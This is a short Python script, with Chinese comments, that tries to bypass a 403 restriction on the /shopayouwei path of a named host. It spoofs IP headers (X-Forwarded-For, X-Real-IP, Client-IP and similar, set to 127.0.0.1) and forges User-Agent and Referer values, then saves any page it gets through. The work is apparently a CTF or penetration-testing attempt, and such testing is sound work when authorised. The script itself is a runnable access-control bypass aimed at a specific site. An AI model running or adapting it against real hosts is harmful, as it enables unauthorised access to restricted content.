import requests

base_url = "http://dc380860.clsadp.com"

# 尝试不同的User-Agent和Referer
headers_attempts = [
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
    {"User-Agent": "curl/7.68.0"},
    {"Referer": "http://dc380860.clsadp.com/"},
    {"Referer": "http://dc380860.clsadp.com/shopayouwei"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"Client-IP": "127.0.0.1"},
    {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Referer": "http://dc380860.clsadp.com/",
        "X-Forwarded-For": "127.0.0.1"
    },
]

print("[*] 尝试不同的HTTP头访问 /shopayouwei...")
for idx, headers in enumerate(headers_attempts):
    try:
        response = requests.get(f"{base_url}/shopayouwei", headers=headers, timeout=5)
        if response.status_code != 403:
            print(f"[+] 尝试 {idx+1}: {response.status_code} - {len(response.content)} bytes")
            print(f"    Headers: {headers}")
            if response.status_code == 200:
                print(f"    [!] 成功!")
                print(f"    响应内容:\n{response.text[:500]}")
                with open(f"shopayouwei_success.html", "w") as f:
                    f.write(response.text)
    except Exception as e:
        pass

# 从主页链接点击过去
print("\n[*] 模拟从主页链接点击...")
session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8"
})

# 先访问主页
response1 = session.get(f"{base_url}/", timeout=5)
print(f"[+] 访问主页: {response1.status_code}")

# 再访问shopayouwei，带上Referer
response2 = session.get(f"{base_url}/shopayouwei", 
                       headers={"Referer": f"{base_url}/"}, 
                       timeout=5)
print(f"[+] 访问shopayouwei: {response2.status_code}")
if response2.status_code == 200:
    print(f"[!] 成功!\n{response2.text[:500]}")
    with open("shopayouwei_via_referer.html", "w") as f:
        f.write(response2.text)

print("\n[*] 测试完成")
